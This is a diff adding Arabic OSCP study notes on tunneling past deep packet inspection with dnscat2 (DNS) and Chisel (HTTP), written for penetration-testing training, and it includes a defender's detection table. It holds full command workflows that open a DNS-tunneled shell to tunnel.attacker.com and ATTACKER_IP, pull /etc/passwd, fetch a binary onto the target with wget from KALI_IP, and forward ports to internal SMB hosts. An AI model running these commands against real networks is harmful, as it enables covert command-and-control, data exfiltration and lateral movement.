+<p>الإنترنت بيعتمد على IP Addresses — مش أسماء. لما تكتب <code>www.example.com</code>، النظام لازم يترجمها لـ IP أولاً عبر DNS. الـ DNS <strong>دايماً</strong> مسموح به عبر الـ Firewalls — حتى الأجهزة بدون أي وصول للإنترنت بتعمل DNS queries عبر محرّل داخلي (Internal Resolver) اللي بيعيد توجيهها.</p>
+
+<div class="callout tip">
+<div class="callout-label">✓ DNS = Last Resort Escape Channel</div>
+<p>حتى في الشبكات الأكثر تقييداً — لا HTTP، لا HTTPS، لا SSH — DNS query على البورت 53 UDP شبه مضمونة إنها تعدّي. ده بيخلّي DNS آخر قناة هروب ممكنة.</p>
+</div>
+
+<h3>أنواع سجلات DNS المهمة</h3>
+<div class="method-grid">
+<div class="method-card">
+  <span class="mnum">A Record</span>
+  <div class="mtitle">Domain → IPv4</div>
+  <div class="mdesc">أشيع نوع — يترجم اسم الدومين لـ IP. مثال: <code>server.example.com → 1.2.3.4</code></div>
+</div>
+<div class="method-card">
+  <span class="mnum">TXT Record</span>
+  <div class="mtitle">نص حر — قابل للاستغلال</div>
+  <div class="mdesc">بيخزَّن أي نص. بيُستخدَم لـ SPF وDKIM — لكن في DNS Tunneling: المهاجم يحشو فيه أوامر مُشفَّرة ويُرجَّعها كـ Response.</div>
+</div>
+<div class="method-card">
+  <span class="mnum">NS Record</span>
+  <div class="mtitle">Authoritative Name Server</div>
+  <div class="mdesc">يحدَّد الـ Server الموثوق للدومين. <strong>المهاجم لازم يتحكَّم في Authoritative NS</strong> لاستقبال DNS queries من الضحايا.</div>
+</div>
+</div>
+
+<h3>سلسلة DNS Resolution</h3>
+<div class="diagram-card">
+<svg viewBox="0 0 700 135" xmlns="http://www.w3.org/2000/svg">
+  <!-- Client -->
+  <rect x="8" y="30" width="100" height="55" rx="6" class="dsvg-box-b"/>
+  <text x="58" y="52" text-anchor="middle" class="dsvg-blue" font-size="10" font-weight="700">Client</text>
+  <text x="58" y="68" text-anchor="middle" class="dsvg-muted" font-size="9">Internal Host</text>
+  <text x="58" y="82" text-anchor="middle" class="dsvg-muted" font-size="8">UDP port 53</text>
+
+  <line x1="108" y1="57" x2="128" y2="57" class="dsvg-line"/>
+  <polygon points="128,52 138,57 128,62" class="dsvg-arr"/>
+
+  <!-- Recursive Resolver -->
+  <rect x="138" y="22" width="115" height="71" rx="6" class="dsvg-box"/>
+  <text x="195" y="48" text-anchor="middle" class="dsvg-txt" font-size="9" font-weight="700">Recursive</text>
+  <text x="195" y="62" text-anchor="middle" class="dsvg-txt" font-size="9" font-weight="700">Resolver</text>
+  <text x="195" y="78" text-anchor="middle" class="dsvg-muted" font-size="8">ISP / Internal</text>
+
+  <line x1="253" y1="57" x2="273" y2="57" class="dsvg-line"/>
+  <polygon points="273,52 283,57 273,62" class="dsvg-arr"/>
+
+  <!-- Root NS -->
+  <rect x="283" y="30" width="90" height="55" rx="6" class="dsvg-box"/>
+  <text x="328" y="52" text-anchor="middle" class="dsvg-txt" font-size="9" font-weight="700">Root NS</text>
+  <text x="328" y="68" text-anchor="middle" class="dsvg-muted" font-size="8">"Ask .com TLD"</text>
+
+  <line x1="373" y1="57" x2="393" y2="57" class="dsvg-line"/>
+  <polygon points="393,52 403,57 393,62" class="dsvg-arr"/>
+
+  <!-- TLD NS -->
+  <rect x="403" y="30" width="90" height="55" rx="6" class="dsvg-box"/>
+  <text x="448" y="52" text-anchor="middle" class="dsvg-txt" font-size="9" font-weight="700">.com TLD</text>
+  <text x="448" y="68" text-anchor="middle" class="dsvg-muted" font-size="8">"Ask attacker.com"</text>
+
+  <line x1="493" y1="57" x2="513" y2="57" class="dsvg-line"/>
+  <polygon points="513,52 523,57 513,62" class="dsvg-arr"/>
+
+  <!-- Authoritative (Attacker) -->
+  <rect x="523" y="14" width="169" height="89" rx="6" class="dsvg-box-r" style="stroke-width:2;"/>
+  <text x="607" y="38" text-anchor="middle" class="dsvg-red" font-size="10" font-weight="700">Authoritative NS</text>
+  <text x="607" y="54" text-anchor="middle" class="dsvg-red" font-size="9">(Attacker Controls!)</text>
+  <text x="607" y="70" text-anchor="middle" class="dsvg-muted" font-size="8">attacker.com</text>
+  <text x="607" y="85" text-anchor="middle" class="dsvg-red" font-size="8" font-weight="700">⚡ يسجَّل كل query!</text>
+
+  <!-- Down arrow from auth -->
+  <line x1="350" y1="95" x2="350" y2="115" class="dsvg-line"/>
+  <text x="350" y="130" text-anchor="middle" class="dsvg-muted" font-size="9">المهاجم يسيطر على Authoritative NS → يرى ويتحكَّم في كل DNS query</text>
+</svg>
+<div class="diagram-caption">لأن المهاجم يتحكَّم في Authoritative NS — كل query لـ *.attacker.com تصله مباشرة</div>
+</div>
+
+<hr />
+
+<!-- ══════════════════════════════════ LU3 -->
+<h2 id="lu3"><span class="num">03</span><span class="htext">مفهوم DNS Tunneling — البيانات في الـ Queries</span></h2>
+
+<h3>الفكرة الأساسية — البيانات الصادرة (Outbound)</h3>
+<p>بدل ما DNS Query عادية تكون <code>www.example.com</code> — في الـ Tunneling، البيانات بتتشفَّر (Base64) وبتتحشى في اسم الـ Subdomain نفسه:</p>
+<div class="code-wrap"><span class="code-tag">مثال — data في subdomain</span><pre><code># DNS Query عادية:
+www.example.com   →   "إيه IP الموقع ده؟"
+
+# DNS Query مع بيانات مُشفَّرة:
+aGVsbG8gd29ybGQ.attacker.com
+# ↑ الـ Subdomain هو البيانات نفسها (Base64: "hello world")
+
+# المهاجم يفك تشفير الـ Subdomain ويُعيد بناء البيانات الأصلية
+echo "aGVsbG8gd29ybGQ" | base64 -d
+# → hello world
+</code></pre></div>
+
+<h3>الفكرة الأساسية — البيانات الواردة (Inbound)</h3>
+<p>المهاجم بيُرسَّل الأوامر <strong>رجوعاً</strong> للجهاز المخترَق عبر <strong>TXT Records</strong> في الـ DNS Response:</p>
+<div class="code-wrap"><span class="code-tag">مثال — command في TXT record</span><pre><code># الاستعلام عن TXT record للـ attacker domain
+dig TXT cmd.attacker.com
+# → "Y2F0IC9ldGMvcGFzc3dk"  (TXT record)
+
+# الجهاز المخترَق يفك التشفير وينفَّذ الأمر
+echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d
+# → cat /etc/passwd  ← الأمر اللي المهاجم أرسله!
+
+# النتيجة تتبعث خارجاً في الـ Subdomain للـ Query التالية
+</code></pre></div>
+
+<h3>القناة ثنائية الاتجاه — Bidirectional Flow</h3>
+<div class="diagram-card">
+<svg viewBox="0 0 700 175" xmlns="http://www.w3.org/2000/svg">
+  <!-- Compromised Host -->
+  <rect x="8" y="50" width="140" height="75" rx="7" class="dsvg-box-r"/>
+  <text x="78" y="74" text-anchor="middle" class="dsvg-red" font-size="10" font-weight="700">Compromised Host</text>
+  <text x="78" y="90" text-anchor="middle" class="dsvg-muted" font-size="9">Internal — Restricted</text>
+  <text x="78" y="106" text-anchor="middle" class="dsvg-muted" font-size="9">dnscat2 client</text>
+
+  <!-- Internal Resolver -->
+  <rect x="200" y="58" width="120" height="59" rx="7" class="dsvg-box"/>
+  <text x="260" y="82" text-anchor="middle" class="dsvg-txt" font-size="9" font-weight="700">Internal DNS</text>
+  <text x="260" y="97" text-anchor="middle" class="dsvg-muted" font-size="8">Resolver</text>
+  <text x="260" y="111" text-anchor="middle" class="dsvg-muted" font-size="8">forwards queries</text>
+
+  <!-- Attacker Auth DNS -->
+  <rect x="490" y="38" width="202" height="99" rx="7" class="dsvg-box-p" style="stroke-width:2;"/>
+  <text x="591" y="62" text-anchor="middle" font-size="11" font-weight="700" style="fill:var(--purple)">Attacker Auth DNS</text>
+  <text x="591" y="78" text-anchor="middle" class="dsvg-muted" font-size="9">dnscat2 server</text>
+  <text x="591" y="94" text-anchor="middle" font-size="9" style="fill:var(--purple)">Sees all queries</text>
+  <text x="591" y="110" text-anchor="middle" font-size="9" style="fill:var(--purple)">Sends TXT responses</text>
+  <text x="591" y="126" text-anchor="middle" class="dsvg-muted" font-size="8">attacker.com</text>
+
+  <!-- Outbound arrow (data in subdomains) -->
+  <line x1="148" y1="72" x2="200" y2="72" class="dsvg-line-g"/>
+  <line x1="320" y1="72" x2="490" y2="72" class="dsvg-line-g"/>
+  <polygon points="200,67 210,72 200,77" class="dsvg-arr-g"/>
+  <polygon points="490,67 500,72 490,77" class="dsvg-arr-g"/>
+  <text x="350" y="60" text-anchor="middle" class="dsvg-green" font-size="9" font-weight="700">→ Data OUT: aGVsbG8.attacker.com (Subdomains)</text>
+
+  <!-- Inbound arrow (commands in TXT) -->
+  <line x1="490" y1="98" x2="320" y2="98" class="dsvg-line-b"/>
+  <line x1="200" y1="98" x2="148" y2="98" class="dsvg-line-b"/>
+  <polygon points="320,93 310,98 320,103" class="dsvg-arr-b"/>
+  <polygon points="148,93 138,98 148,103" class="dsvg-arr-b"/>
+  <text x="350" y="145" text-anchor="middle" class="dsvg-blue" font-size="9" font-weight="700">← Commands IN: TXT = "Y2F0IC9ldGMvcGFzc3dk" (Encoded command)</text>
+</svg>
+<div class="diagram-caption">قناة ثنائية الاتجاه — Firewall يرى DNS Queries عادية فقط</div>
+</div>
+
+<h3>تحديات نقل البيانات عبر DNS</h3>
+<div class="table-wrap"><table>
+<thead><tr><th>التحدّي</th><th>التفاصيل</th><th>الحل</th></tr></thead>
+<tbody>
+<tr><td>حجم صغير جداً</td><td>Max ~253 حرف لكل Subdomain Label</td><td>Base64 encoding + تقسيم لـ Chunks (~50-100 bytes)</td></tr>
+<tr><td>بطء شديد</td><td>ملف 1MB = ~10,000+ DNS query</td><td>استخدام DNS Tunneling للـ C2 فقط مش نقل بيانات كبيرة</td></tr>
+<tr><td>قابل للكشف</td><td>حجم queries غير طبيعي، Subdomains طويلة</td><td>التمويه بين Query وأخرى، اختيار توقيت مناسب</td></tr>
+<tr><td>Latency عالي</td><td>كل Round-Trip مر عبر DNS Hierarchy</td><td>تجنّب Sessions تفاعلية — استخدمه لـ One-Shot commands</td></tr>
+</tbody>
+</table></div>
+
+<hr />
+
+<!-- ══════════════════════════════════ LU4 -->
+<h2 id="lu4"><span class="num">04</span><span class="htext">DNS Tunneling بـ dnscat2 — C2 كامل عبر DNS</span></h2>
+
+<h3>إيه هو dnscat2؟</h3>
+<div class="callout definition">
+<div class="callout-label">⬦ dnscat2</div>
+<p>dnscat2 هو Framework C2 (Command and Control) كامل مبني على DNS Tunneling. بيوفَّر: Remote Shell — نقل ملفات — Port Forwarding — كل ده مخبَّى جوّا DNS queries عادية. يستخدم Authentication Phrase للتحقق من سلامة النفق.</p>
+</div>
+
+<h3>dnscat2 — Server Setup</h3>
+<div class="callout warning">
+<div class="callout-label">⚠ شرط أساسي</div>
+<p>المهاجم لازم يملك <strong>Authoritative DNS Server</strong> لدومين يتحكَّم فيه (مثلاً <code>tunnel.attacker.com</code>). يوقَّف أي DNS Service شغّال على البورت 53 أولاً (Dnsmasq, BIND, etc.).</p>
+</div>
+
+<div class="code-wrap"><span class="code-tag">bash — dnscat2 server + client</span><pre><code># ====== على جهاز المهاجم (Authoritative NS) ======
+# إيقاف أي DNS service شغّال
+sudo service dnsmasq stop
+
+# تشغيل dnscat2 server
+sudo ruby dnscat2.rb tunnel.attacker.com
+# Listening on UDP port 53...
+# Waiting for connections...
+
+# ====== على الجهاز المخترَق ======
+./dnscat tunnel.attacker.com
+# Connecting...
+
+# ====== على الطرفين — التحقق من Authentication Phrase ======
+# Server: Secret: 'purple-elephant-dance'
+# Client: Secret: 'purple-elephant-dance'
+# ↑ يجب أن يتطابقا — يضمن النفق لم يُعترَض
+
+# مراقبة DNS Traffic لتأكيد النشاط
+sudo tcpdump -i eth0 udp port 53 -X
+</code></pre></div>
+
+<h3>استخدام dnscat2 — Shell وPort Forwarding</h3>
+<div class="code-wrap"><span class="code-tag">dnscat2 — console commands</span><pre><code># في dnscat2 Server Console:
+dnscat2> sessions
+# New session established: 1
+
+dnscat2> session -i 1
+# Interact with session 1
+
+# فتح Shell تفاعلي
+command (session 1)> shell
+# Now you have a shell!
+
+# ====== Port Forwarding عبر DNS ======
+# إنشاء Port Forward من المهاجم لـ SMB الداخلي
+command (session 1)> listen 127.0.0.1:4455
+connect 172.16.50.217:445
+# Listener created on 127.0.0.1:4455
+
+# الوصول لـ SMB الداخلي عبر نفق DNS!
+smbclient -p 4455 //127.0.0.1/scripts -U hr_admin
+# ← SMB Shares تظهر عبر DNS queries!
+</code></pre></div>
+
+<h3>سيناريو المؤسسة — 10 خطوات</h3>
+<div class="step-track">
+<div class="step-item"><div class="step-num">1</div><div class="step-title">الوصول الأولي</div><div class="step-body"><p>استغلال تطبيق ويب ضعيف على الـ App Server الداخلي — الحصول على Remote Command Execution.</p></div></div>
+<div class="step-item"><div class="step-num">2</div><div class="step-title">اكتشاف القيود</div><div class="step-body"><p>كل الترافيك الصادر محجوب ما عدا DNS. HTTP فشل، SSH فشل، Reverse Shells كلها فشلت.</p></div></div>
+<div class="step-item"><div class="step-num">3</div><div class="step-title">تسجيل دومين للمهاجم</div><div class="step-body"><p>إعداد External Authoritative DNS Server لدومين يتحكَّم فيه المهاجم (مثلاً <code>attacker-c2.com</code>).</p></div></div>
+<div class="step-item"><div class="step-num">4</div><div class="step-title">تشغيل dnscat2 Server</div><div class="step-body"><p>تشغيل dnscat2 على الـ Authoritative Server يستمع على UDP:53.</p></div></div>
+<div class="step-item"><div class="step-num">5</div><div class="step-title">رفع وتشغيل Client</div><div class="step-body"><p>نقل dnscat2 binary للجهاز المخترَق وتشغيله يشير للدومين المتحكَّم فيه.</p></div></div>
+<div class="step-item"><div class="step-num">6</div><div class="step-title">تأسيس قناة C2</div><div class="step-body"><p>DNS queries تتدفَّق عبر Internal Resolver → TLD → Attacker Auth DNS → C2 نشط.</p></div></div>
+<div class="step-item"><div class="step-num">7</div><div class="step-title">تسريب البيانات</div><div class="step-body"><p>سجلات قاعدة البيانات تتشفَّر في Subdomains وتُرسَل بـ DNS Queries → تُعاد بناؤها على Server المهاجم.</p></div></div>
+<div class="step-item"><div class="step-num">8</div><div class="step-title">إرسال الأوامر رجوعاً</div><div class="step-body"><p>المهاجم يُرسَّل أوامر مُشفَّرة في TXT Records → الـ Client يفكّها وينفَّذها.</p></div></div>
+<div class="step-item"><div class="step-num">9</div><div class="step-title">التحرّك للعمق</div><div class="step-body"><p>Port Forward عبر نفق DNS للوصول للـ File Servers والـ DB Servers الداخلية ببيانات مالية.</p></div></div>
+<div class="step-item"><div class="step-num">10</div><div class="step-title">الكشف في النهاية</div><div class="step-body"><p>فريق الأمان يلاحظ: حجم DNS غير طبيعي، Subdomains طويلة وعشوائية، استعلامات لدومين خارجي غير معروف.</p></div></div>
+</div>
+
+<hr />
+
+<!-- ══════════════════════════════════ COMPARE -->
+<h2 id="compare"><span class="htext">Chisel مقابل dnscat2 — متى تستخدم أيهما</span></h2>
+
+<div class="table-wrap"><table>
+<thead><tr><th>المعيار</th><th>🌐 Chisel (HTTP Tunneling)</th><th>🔵 dnscat2 (DNS Tunneling)</th></tr></thead>
+<tbody>
+<tr><td>متى تستخدمه</td><td>HTTP/HTTPS مسموح صادراً</td><td>كل شيء محجوب ما عدا DNS — آخر حل</td></tr>
+<tr><td>الأداء</td><td>سريع ومستقر — الخيار الأفضل عند التوفر</td><td>بطيء جداً وـ Latency عالية</td></tr>
+<tr><td>القدرات</td><td>Full SOCKS Proxy — أي host/port داخلي</td><td>Shell، نقل ملفات، Port Forwarding</td></tr>
+<tr><td>التشفير</td><td>SSH-style داخل HTTP/WebSocket</td><td>مُشفَّر — محتوى غير مرئي لـ DPI</td></tr>
+<tr><td>النشر</td><td>Binary واحد — سهل جداً</td><td>يحتاج Ruby على الـ Server + Binary للـ Client</td></tr>
+<tr><td>المتطلبات</td><td>Kali يستقبل HTTP من الهدف</td><td>Authoritative DNS Server لدومين متحكَّم فيه</td></tr>
+<tr><td>قابلية الكشف</td><td>WebSocket طويل — أحياناً مشبوه</td><td>🔴 مرتفعة — DNS Anomaly Detection</td></tr>
+<tr><td>حالة الاستخدام</td><td>السيناريوهات الشائعة في الـ Engagement</td><td>البيئات المقيَّدة للغاية كملاذ أخير</td></tr>
+</tbody>
+</table></div>
+
+<div class="callout examtip">
+<div class="callout-label">★ قرار الاختيار</div>
+<p>دايماً جرَّب Chisel أول — أسرع وأسهل وأقل ضوضاء. انتقل لـ dnscat2 فقط لو HTTP Tunneling فشل. في البيئات الحقيقية، امتلك الاثنين جاهزين — كل بيئة بتحجب حاجة مختلفة.</p>
+</div>
+
+<hr />
+
+<!-- ══════════════════════════════════ CHEAT SHEET -->
+<h2 id="cheat"><span class="htext">Cheat Sheet مرجعي</span></h2>
+<div class="cheat-section">
+
+<h4>Chisel — سير العمل الكامل</h4>
+<div class="code-wrap"><span class="code-tag">bash — chisel full workflow</span><pre><code># ===== KALI (Server) =====
+# استضافة الـ Binary
+sudo cp $(which chisel) /var/www/html/
+sudo systemctl start apache2
+
+# تشغيل الـ Server
+chisel server --port 8080 --reverse
+
+# التحقق من الـ SOCKS Proxy بعد اتصال Client
+ss -ntplu | grep 1080
+# → 127.0.0.1:1080
+
+# SSH عبر النفق
+ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' \
+    user@INTERNAL_HOST
+
+# ProxyChains بديل (بعد تعديل /etc/proxychains4.conf)
+# أضف: socks5 127.0.0.1 1080
+proxychains nmap -sT -p 22,80,443 INTERNAL_HOST
+
+# ===== TARGET (Client) =====
+wget http://KALI_IP/chisel -O /tmp/chisel
+chmod +x /tmp/chisel
+/tmp/chisel client KALI_IP:8080 R:socks
+</code></pre></div>
+
+<h4>dnscat2 — سير العمل الكامل</h4>
+<div class="code-wrap"><span class="code-tag">bash — dnscat2 full workflow</span><pre><code># ===== ATTACKER AUTH DNS SERVER =====
+sudo service dnsmasq stop          # إيقاف أي DNS service
+sudo ruby dnscat2.rb tunnel.attacker.com
+# أو بدون Domain (يعمل على IP مباشرة)
+sudo ruby dnscat2.rb --dns "host=ATTACKER_IP,port=53"
+
+# مراقبة الترافيك
+sudo tcpdump -i eth0 udp port 53 -X
+
+# ===== COMPROMISED HOST (Client) =====
+./dnscat tunnel.attacker.com
+# أو بـ IP مباشرة
+./dnscat --dns "server=ATTACKER_IP,port=53"
+
+# ===== dnscat2 SERVER CONSOLE =====
+dnscat2> sessions              # عرض الجلسات النشطة
+dnscat2> session -i 1         # التفاعل مع جلسة
+command (1)> shell             # فتح Shell
+command (1)> download /etc/passwd /tmp/  # تنزيل ملف
+command (1)> upload /tmp/tool /tmp/tool  # رفع ملف
+command (1)> listen 127.0.0.1:4455       # Port Forward
+connect 172.16.50.217:445
+
+# SMB عبر DNS tunnel
+smbclient -p 4455 //127.0.0.1/share -U user
+</code></pre></div>
+
+<h4>ProxyChains مع Chisel</h4>
+<div class="code-wrap"><span class="code-tag">bash — proxychains setup</span><pre><code"># تعديل /etc/proxychains4.conf
+# آخر سطر: socks5 127.0.0.1 1080
+
+# استخدام ProxyChains مع أي أداة
+proxychains nmap -sT -p- INTERNAL_IP
+proxychains curl http://INTERNAL_HOST
+proxychains evil-winrm -i INTERNAL_IP -u user -p pass
+proxychains impacket-psexec user:pass@INTERNAL_IP
+</code></pre></div>
+
+<h4>كشف DNS Tunneling — ما يراه المدافع</h4>
+<div class="table-wrap"><table>
+<thead><tr><th>المؤشر</th><th>السبب</th><th>أداة الكشف</th></tr></thead>
+<tbody>
+<tr><td>Subdomain names طويلة وعشوائية</td><td>البيانات مُشفَّرة في الاسم</td><td>DNS Anomaly Detection</td></tr>
+<tr><td>حجم DNS queries مرتفع بشكل غير طبيعي</td><td>نقل بيانات عبر DNS</td><td>SIEM / DNS Log Analysis</td></tr>
+<tr><td>Queries لدومين واحد بشكل متكرّر</td><td>C2 communications</td><td>DNS Query Monitoring</td></tr>
+<tr><td>TXT Records بمحتوى مُشفَّر</td><td>أوامر واردة من المهاجم</td><td>Deep DNS Inspection</td></tr>
+<tr><td>Queries لدومين غير معروف</td><td>دومين المهاجم المستحدث</td><td>DNS Reputation Feeds</td></tr>
+</tbody>
+</table></div>
+
+<h4>مقارنة سريعة — تقنيات الـ Tunneling</h4>
+<div class="table-wrap"><table>
+<thead><tr><th>التقنية</th><th>الأساليب التقليدية</th><th>Chisel (HTTP)</th><th>dnscat2 (DNS)</th></tr></thead>
+<tbody>
+<tr><td>الشرط</td><td>أي TCP مسموح</td><td>HTTP مسموح</td><td>DNS مسموح فقط</td></tr>
+<tr><td>الأداء</td><td>🟢 ممتاز</td><td>🟡 جيد</td><td>🔴 بطيء</td></tr>
+<tr><td>صعوبة الكشف</td><td>🔴 سهل</td><td>🟡 متوسط</td><td>🟡 متوسط-صعب</td></tr>
+<tr><td>الإعداد</td><td>🟢 بسيط</td><td>🟡 متوسط</td><td>🔴 يحتاج Auth DNS</td></tr>
+<tr><td>Port Forwarding</td><td>✓</td><td>✓ (SOCKS)</td><td>✓ (بطيء)</td></tr>
+</tbody>
+</table></div>
+
+</div>
+
+<hr />
+
+<!-- ══════════════════════════════════ SUMMARY -->
+<h2 id="summary"><span class="htext">الخلاصة العامة للموديول</span></h2>
+<p>الموديول ده علَّمنا إزاي نتعامل مع أكثر البيئات تقييداً — لما الـ DPI بيحجب كل الأساليب التقليدية، الحل هو إخفاء الترافيك داخل بروتوكولات مسموح بها (HTTP أو DNS).</p>
+
+<div class="takeaways">
+<div class="takeaways-title">$ cat ./module17_summary.txt</div>
+<ul>
+<li>DPI بيفحص محتوى الـ Packets — مش البورت فقط — وبيكشف SSH وRaw TCP حتى على البورتات المسموح بها</li>
+<li>Chisel بيلفّ أي ترافيك جوّا HTTP/WebSocket — DPI يشوفه تطبيق ويب طبيعي</li>
+<li>معمارية Chisel: Client على الهدف يتصَّل خارجياً (مسموح) → SOCKS Proxy يفتح على Kali:1080</li>
+<li>GLIBC incompatibility مشكلة شائعة — اختبر إصدارات الـ Binary وجمَّع للـ Target OS</li>
+<li>DNS مسموح به تقريباً في كل مكان — حتى الشبكات المعزولة بتعمل DNS queries عبر Internal Resolver</li>
+<li>DNS Tunneling: بيانات صادرة في Subdomains، أوامر واردة في TXT Records — قناة C2 كاملة</li>
+<li>dnscat2 يوفَّر Shell كامل + نقل ملفات + Port Forwarding — كل ده جوّا DNS</li>
+<li>DNS Tunneling بطيء وصاخب — حجم Queries غير طبيعي يمكن كشفه بـ DNS Anomaly Monitoring</li>
+<li>الأولوية: جرَّب Chisel أول → لو فشل جرَّب dnscat2 → دايماً امتلك كلا الأداتين جاهزتين</li>
+</ul>
+</div>
+
+<blockquote>
+<p><strong>القيد الأمني الحقيقي مش البورت — هو البروتوكول.</strong> طالما فيه بروتوكول مسموح به — HTTP أو DNS — يمكن بناء نفق كامل فوقه. المهاجم المحترف دايماً عنده طريقة بديلة في جيبه لكل قيد يواجهه.</p>
+</blockquote>
+
+<div class="callout examtip">
+<div class="callout-label">★ Professional Mindset</div>
+<p>في الـ Engagement: شوف إيه المسموح صادراً → جرَّب HTTP Tunneling (Chisel) أول → لو محجوب جرَّب DNS (dnscat2) → وثَّق كل محاولة. وجود Authoritative DNS جاهز مسبقاً للـ Engagements الحساسة قرار احترافي مهم.</p>
+</div>
+
+<hr />
+<p><em>نهاية نوتس الموديول السابع عشر — OSCP: Tunneling Through Deep Packet Inspection</em></p>
+<div class="footer-note">-- EOF: module-17/tunneling-dpi.md --</div>
+</div>
+
+<script>
+(function(){
+  var root=document.documentElement,btn=document.getElementById('themeSwitch');
+  function applyTheme(t){root.setAttribute('data-theme',t);btn.textContent='theme: '+t;try{localStorage.setItem('oscp-notes-theme',t);}catch(e){}}
+  var saved='dark';try{saved=localStorage.getItem('oscp-notes-theme')||'dark';}catch(e){}
+  applyTheme(saved);
+  btn.addEventListener('click',function(){applyTheme(root.getAttribute('data-theme')==='dark'?'light':'dark');});
+  var bar=document.getElementById('progressBar');
+  function onScroll(){var h=document.documentElement,s=h.scrollTop,ht=h.scrollHeight-h.clientHeight;bar.style.width=(ht>0?(s/ht*100):0)+'%';var t=document.getElementById('toTop');s>500?t.classList.add('show'):t.classList.remove('show');}
+  document.addEventListener('scroll',onScroll);onScroll();
+  document.getElementById('toTop').addEventListener('click',function(){window.scrollTo({top:0,behavior:'smooth'});});
+  document.querySelectorAll('.code-wrap').forEach(function(wrap){
+    var c=wrap.querySelector('code');if(!c)return;
+    var b=document.createElement('button');b.className='copy-btn';b.textContent='copy';
+    b.addEventListener('click',function(){if(navigator.clipboard){navigator.clipboard.writeText(c.innerText).then(function(){b.textContent='copied ✓';b.classList.add('copied');setTimeout(function(){b.textContent='copy';b.classList.remove('copied');},1500);});}});
+    wrap.appendChild(b);
+  });
+})();
+</script>
+</body>
+</html>
